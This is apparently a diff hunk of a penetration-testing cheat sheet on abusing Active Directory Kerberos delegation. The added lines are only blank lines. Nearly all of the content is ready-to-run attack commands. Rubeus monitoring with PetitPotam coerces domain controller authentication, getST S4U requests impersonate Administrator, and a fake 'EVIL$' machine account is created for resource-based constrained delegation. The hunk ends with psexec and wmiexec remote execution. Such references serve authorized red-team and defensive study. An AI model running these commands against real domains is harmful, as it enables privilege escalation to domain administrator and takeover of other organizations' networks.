@@ -156,23 +156,30 @@ bloodyAD --host <DC_IP> -d <domain.local> -u <user> -p '<pass>' get object <targ
 # Unconstrained delegation — coerce DC auth, then extract TGT from memory
 # (identify via BloodHound: UNCONSTRAINED edge, or:)
 Get-DomainComputer -Unconstrained   # PowerView
+
 # on compromised unconstrained box: run Rubeus monitor, then coerce
 Rubeus.exe monitor /interval:5 /nowrap
 python3 PetitPotam.py -u <user> -p '<pass>' <listener_ip> <DC_IP>
 
 # Constrained delegation (S4U2Self/S4U2Proxy)
 getST.py -spn <target_SPN> -impersonate Administrator <domain.local>/<svc_account>:'<pass>'
+
 export KRB5CCNAME=Administrator.ccache
+
 impacket-psexec -k -no-pass <domain.local>/Administrator@<target_host>
 
 # Resource-Based Constrained Delegation (RBCD) — needs GenericWrite/GenericAll on target computer object
 # 1. Add a fake computer account (if MachineAccountQuota > 0)
 addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' <domain.local>/<user>:'<pass>'
+
 # 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target
 rbcd.py -delegate-from 'EVIL$' -delegate-to '<target_computer>$' -action write <domain.local>/<user>:'<pass>'
+
 # 3. Get ST impersonating Administrator via the fake computer
 getST.py -spn cifs/<target_computer>.<domain.local> -impersonate Administrator '<domain.local>/EVIL$:Passw0rd!'
+
 export KRB5CCNAME=Administrator.ccache
+
 wmiexec.py -k -no-pass <domain.local>/Administrator@<target_computer>.<domain.local>
 ```
 
